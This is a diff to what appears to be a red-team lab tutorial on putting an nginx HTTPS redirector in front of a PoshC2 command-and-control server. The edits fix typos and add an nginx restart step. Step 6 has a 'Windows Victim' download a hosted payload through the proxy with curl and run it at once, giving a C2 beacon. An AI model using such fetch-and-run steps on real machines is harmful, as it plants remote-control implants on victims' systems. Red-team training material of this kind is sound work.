@@ -10,8 +10,8 @@
     ```bash 
     mv {posh.crt,posh.key} /etc/nginx/.
     ```
-    > **NOTE:** Make sure you are in your users home folder `/home/<usernmae>
-4. Then lets move over to our ubuntu server and edit our `/etc/nginx/conf.d/lp_proxy.conf` and add our SSL rules under our rules for 80 coms
+    > **NOTE:** Make sure you are in your users home folder `/home/<username>
+4. Then lets move over to our ubuntu server and edit our `/etc/nginx/conf.d/lp_proxy.conf` and add our SSL rules underneath our rules for port 80 comms
     ```nginx
     server {
         listen 443;
@@ -27,10 +27,13 @@
     }
     ```
 
-5. Now we just reload our nginx service and it should apply all our changes
-6. On our Windows Vict. lets download our hosted payload through our proxy using `curl`
+5. Now reload nginx
+    ```
+    systemctl restart nginx.service
+    ```
+6. On our Windows Victim, lets download our hosted payload through our proxy using `curl`
     ```bash
-    curl -k https://192.168.178.132/<poshc2-uri> -o apples.exe && .\apples.exe
+    curl -k https://<posh or proxy IP>/<poshc2-uri> -o apples.exe && .\apples.exe
     ```
 7. Boom you now have a HTTPS beacon. 
 
